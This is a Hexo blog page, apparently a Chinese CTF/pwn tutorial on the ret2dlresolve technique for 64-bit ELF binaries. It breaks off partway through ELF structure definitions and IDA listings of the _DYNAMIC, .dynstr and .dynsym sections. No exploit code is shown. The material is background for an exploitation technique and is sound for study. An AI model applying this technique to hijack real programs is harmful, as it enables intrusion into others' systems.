@@ -1,0 +1,1551 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="参考链接：https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;oyne1i#zDOuK  64位的程序与32为程序的动态链接过程基本相同，不同的是一些结构体的参数 ELF结构体_DYNAMICELF64_Dyn结构体的定义如下： 123456789101112typedef struct&amp;#123;  Elf64_Sxword	d_tag;			&#x2F;* Dynamic">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dlresolve_x64">
+<meta property="og:url" content="http://example.com/2022/07/02/ret2dlresolve_x64/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="参考链接：https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;oyne1i#zDOuK  64位的程序与32为程序的动态链接过程基本相同，不同的是一些结构体的参数 ELF结构体_DYNAMICELF64_Dyn结构体的定义如下： 123456789101112typedef struct&amp;#123;  Elf64_Sxword	d_tag;			&#x2F;* Dynamic">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/wqf/AppData/Roaming/Typora/typora-user-images/image-20220702124924060.png">
+<meta property="og:image" content="c:/Users/wqf/AppData/Roaming/Typora/typora-user-images/image-20220702155244346.png">
+<meta property="og:image" content="c:/Users/wqf/AppData/Roaming/Typora/typora-user-images/image-20220702193429817.png">
+<meta property="og:image" content="c:/Users/wqf/AppData/Roaming/Typora/typora-user-images/image-20220702214841894.png">
+<meta property="og:image" content="c:/Users/wqf/AppData/Roaming/Typora/typora-user-images/image-20220702222849521.png">
+<meta property="og:image" content="c:/Users/wqf/AppData/Roaming/Typora/typora-user-images/image-20220702223316673.png">
+<meta property="og:image" content="c:/Users/wqf/AppData/Roaming/Typora/typora-user-images/image-20220702223620586.png">
+<meta property="og:image" content="c:/Users/wqf/AppData/Roaming/Typora/typora-user-images/image-20220702224848912.png">
+<meta property="og:image" content="c:/Users/wqf/AppData/Roaming/Typora/typora-user-images/image-20220702224806957.png">
+<meta property="article:published_time" content="2022-07-02T03:47:01.442Z">
+<meta property="article:modified_time" content="2022-07-03T13:36:27.877Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/wqf/AppData/Roaming/Typora/typora-user-images/image-20220702124924060.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>ret2dlresolve_x64 · 渐渐的博客</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
+    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
+    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>渐渐的博客</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">渐渐的博客</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">ret2dlresolve_x64</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/wlop1.jpeg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                ret2dlresolve_x64
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">6.2k</span>Reading time: <span class="post-count reading-time">35 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/07/02</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p> 参考链接：<a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/oyne1i#zDOuK">https://www.yuque.com/cyberangel/rg9gdm/oyne1i#zDOuK</a></p>
+</blockquote>
+<p>64位的程序与32为程序的动态链接过程基本相同，不同的是一些结构体的参数</p>
+<h3 id="ELF结构体"><a href="#ELF结构体" class="headerlink" title="ELF结构体"></a>ELF结构体</h3><h4 id="DYNAMIC"><a href="#DYNAMIC" class="headerlink" title="_DYNAMIC"></a>_DYNAMIC</h4><p>ELF64_Dyn结构体的定义如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"><span class="keyword">typedef</span>	<span class="keyword">int64_t</span>  Elf64_Sxword;      <span class="keyword">int64_t</span>大小为<span class="number">8</span>字节</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Xword;       <span class="keyword">uint64_t</span>大小为<span class="number">8</span>字节</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;        <span class="keyword">uint64_t</span>大小为<span class="number">8</span>字节</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0000000000600908</span> _DYNAMIC        Elf64_Dyn &lt;<span class="number">1</span>, <span class="number">1</span>&gt;        ; DATA XREF: LOAD:<span class="number">0000000000400130</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000600908</span>                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:<span class="number">0000000000600908</span>                                         ; DT_NEEDED libc.so<span class="number">.6</span></span><br><span class="line">LOAD:<span class="number">0000000000600918</span>                 Elf64_Dyn &lt;<span class="number">0</span>Ch, <span class="number">4004B</span>0h&gt; ; DT_INIT</span><br><span class="line">LOAD:<span class="number">0000000000600928</span>                 Elf64_Dyn &lt;<span class="number">0</span>Dh, <span class="number">400784</span>h&gt; ; DT_FINI</span><br><span class="line">LOAD:<span class="number">0000000000600938</span>                 Elf64_Dyn &lt;<span class="number">19</span>h, <span class="number">6008F</span>8h&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:<span class="number">0000000000600948</span>                 Elf64_Dyn &lt;<span class="number">1B</span>h, <span class="number">8</span>&gt;      ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">0000000000600958</span>                 Elf64_Dyn &lt;<span class="number">1</span>Ah, <span class="number">600900</span>h&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:<span class="number">0000000000600968</span>                 Elf64_Dyn &lt;<span class="number">1</span>Ch, <span class="number">8</span>&gt;      ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">0000000000600978</span>                 Elf64_Dyn &lt;<span class="number">6F</span>FFFEF5h, <span class="number">400260</span>h&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:<span class="number">0000000000600988</span>                 Elf64_Dyn &lt;<span class="number">5</span>, <span class="number">400360</span>h&gt;  ; DT_STRTAB</span><br><span class="line">LOAD:<span class="number">0000000000600998</span>                 Elf64_Dyn &lt;<span class="number">6</span>, <span class="number">400288</span>h&gt;  ; DT_SYMTAB</span><br><span class="line">LOAD:<span class="number">00000000006009</span>A8                 Elf64_Dyn &lt;<span class="number">0</span>Ah, <span class="number">5</span>Eh&gt;    ; DT_STRSZ</span><br><span class="line">LOAD:<span class="number">00000000006009B</span>8                 Elf64_Dyn &lt;<span class="number">0B</span>h, <span class="number">18</span>h&gt;    ; DT_SYMENT</span><br><span class="line">LOAD:<span class="number">00000000006009</span>C8                 Elf64_Dyn &lt;<span class="number">15</span>h, <span class="number">0</span>&gt;      ; DT_DEBUG</span><br><span class="line">LOAD:<span class="number">00000000006009</span>D8                 Elf64_Dyn &lt;<span class="number">3</span>, <span class="number">600</span>AE8h&gt;  ; DT_PLTGOT</span><br><span class="line">LOAD:<span class="number">00000000006009E8</span>                 Elf64_Dyn &lt;<span class="number">2</span>, <span class="number">60</span>h&gt;      ; DT_PLTRELSZ</span><br><span class="line">LOAD:<span class="number">00000000006009F</span>8                 Elf64_Dyn &lt;<span class="number">14</span>h, <span class="number">7</span>&gt;      ; DT_PLTREL</span><br><span class="line">LOAD:<span class="number">0000000000600</span>A08                 Elf64_Dyn &lt;<span class="number">17</span>h, <span class="number">400450</span>h&gt; ; DT_JMPREL</span><br><span class="line">LOAD:<span class="number">0000000000600</span>A18                 Elf64_Dyn &lt;<span class="number">7</span>, <span class="number">4003F</span>0h&gt;  ; DT_RELA</span><br><span class="line">LOAD:<span class="number">0000000000600</span>A28                 Elf64_Dyn &lt;<span class="number">8</span>, <span class="number">60</span>h&gt;      ; DT_RELASZ</span><br><span class="line">LOAD:<span class="number">0000000000600</span>A38                 Elf64_Dyn &lt;<span class="number">9</span>, <span class="number">18</span>h&gt;      ; DT_RELAENT</span><br><span class="line">LOAD:<span class="number">0000000000600</span>A48                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFFEh, <span class="number">4003</span>D0h&gt; ; DT_VERNEED</span><br><span class="line">LOAD:<span class="number">0000000000600</span>A58                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFFFh, <span class="number">1</span>&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:<span class="number">0000000000600</span>A68                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFF0h, <span class="number">4003B</span>Eh&gt; ; DT_VERSYM</span><br><span class="line">LOAD:<span class="number">0000000000600</span>A78                 Elf64_Dyn &lt;<span class="number">0</span>&gt;           ; DT_NULL</span><br><span class="line">LOAD:<span class="number">0000000000600</span>A88                 db    <span class="number">0</span></span><br><span class="line">LOAD:<span class="number">0000000000600</span>A89                 db    <span class="number">0</span></span><br><span class="line">LOAD:<span class="number">0000000000600</span>A8A                 db    <span class="number">0</span></span><br><span class="line">LOAD:<span class="number">0000000000600</span>A8B                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="dynstr——DT-STRTAB"><a href="#dynstr——DT-STRTAB" class="headerlink" title=".dynstr——DT_STRTAB"></a>.dynstr——DT_STRTAB</h4><p>ELF_String_Table</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">LOAD:<span class="number">0000000000400360</span> ; ELF String Table</span><br><span class="line">LOAD:<span class="number">0000000000400360</span> byte_400360     db <span class="number">0</span>                    ; DATA XREF: LOAD:<span class="number">00000000004002</span>A0↑o</span><br><span class="line">LOAD:<span class="number">0000000000400360</span>                                         ; LOAD:<span class="number">00000000004002B</span>8↑o ...</span><br><span class="line">LOAD:<span class="number">0000000000400361</span> aLibcSo6        db <span class="string">&#x27;libc.so.6&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">00000000004003</span>D0↓o</span><br><span class="line">LOAD:<span class="number">000000000040036B</span> aStdin          db <span class="string">&#x27;stdin&#x27;</span>,<span class="number">0</span>            ; DATA XREF: LOAD:<span class="number">0000000000400348</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000400371</span> aStrlen         db <span class="string">&#x27;strlen&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">00000000004002B</span>8↑o</span><br><span class="line">LOAD:<span class="number">0000000000400378</span> aRead           db <span class="string">&#x27;read&#x27;</span>,<span class="number">0</span>             ; DATA XREF: LOAD:<span class="number">00000000004002E8</span>↑o</span><br><span class="line">LOAD:<span class="number">000000000040037</span>D aStdout         db <span class="string">&#x27;stdout&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">0000000000400330</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000400384</span> aSetbuf         db <span class="string">&#x27;setbuf&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">00000000004002</span>D0↑o</span><br><span class="line">LOAD:<span class="number">000000000040038B</span> aLibcStartMain  db <span class="string">&#x27;__libc_start_main&#x27;</span>,<span class="number">0</span></span><br><span class="line">LOAD:<span class="number">000000000040038B</span>                                         ; DATA XREF: LOAD:<span class="number">0000000000400300</span>↑o</span><br><span class="line">LOAD:<span class="number">000000000040039</span>D aWrite          db <span class="string">&#x27;write&#x27;</span>,<span class="number">0</span>            ; DATA XREF: LOAD:<span class="number">00000000004002</span>A0↑o</span><br><span class="line">LOAD:<span class="number">00000000004003</span>A3 aGlibc225       db <span class="string">&#x27;GLIBC_2.2.5&#x27;</span>,<span class="number">0</span>      ; DATA XREF: LOAD:<span class="number">00000000004003E0</span>↓o</span><br><span class="line">LOAD:<span class="number">00000000004003</span>AF aGmonStart      db <span class="string">&#x27;__gmon_start__&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">0000000000400318</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004003B</span>E ; ELF GNU Symbol Version Table</span><br></pre></td></tr></table></figure>
+
+<h4 id="dynsym——DT-SYMTAB"><a href="#dynsym——DT-SYMTAB" class="headerlink" title=".dynsym——DT_SYMTAB"></a>.dynsym——DT_SYMTAB</h4><p>ELF Symbol Table : ELF64_Sym结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span>         <span class="comment">//4字节       </span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span>                <span class="comment">//1字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;		<span class="comment">/* Symbol visibility */</span>                      <span class="comment">//1字节</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span>                          <span class="comment">//2字节</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span>                           <span class="comment">//8字节</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span>                            <span class="comment">//8字节</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf64_Word;   </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf64_Section;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Xword;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>与32位的进行对比</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span>    <span class="number">4</span>字节</span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span>                      <span class="number">4</span>字节</span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span>                       <span class="number">4</span>字节</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span>           <span class="number">1</span>字节</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span>                 <span class="number">1</span>字节</span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span>                     <span class="number">2</span>字节</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
+
+<p>发现64位与32位的结构体成员顺序和大小不一样</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0000000000400288</span> ; ELF Symbol Table</span><br><span class="line">LOAD:<span class="number">0000000000400288</span>                 Elf64_Sym &lt;<span class="number">0</span>&gt;</span><br><span class="line">LOAD:<span class="number">00000000004002</span>A0                 Elf64_Sym &lt;offset aWrite - offset byte_400360, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;write&quot;</span></span><br><span class="line">LOAD:<span class="number">00000000004002B</span>8                 Elf64_Sym 